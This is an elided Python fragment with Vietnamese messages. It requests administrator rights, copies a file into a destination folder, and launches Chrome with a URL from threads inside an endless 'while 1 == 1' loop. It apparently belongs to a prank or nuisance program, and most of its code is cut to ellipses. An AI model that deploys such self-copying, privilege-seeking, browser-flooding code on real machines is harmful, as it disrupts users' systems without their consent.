...
def codelord(filename, current_path, destination, file_path):
    ...
    if os.path.exists(os.path.join(destination, filename)):
        ...
        shutil.copyfile(
            os.path.join(current_path, filename), os.path.join(destination, filename)
        )
    else:
...
def main():
    ...
    if is_admin():
        ...
        print("Đang Yêu Cầu Quyền ADMINSTRATOR")
        try:
            ...
            print(f"Không thể yêu cầu quyền admin: {e}")
...
def runCode(urlRunning):
    thread1 = threading.Thread(
        ...
        args=(
            ["C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", urlRunning],
        ),
    )
...
while 1 == 1:
    threads = [
        threading.Thread(target=open_browser, args=(browser, urlRunning))
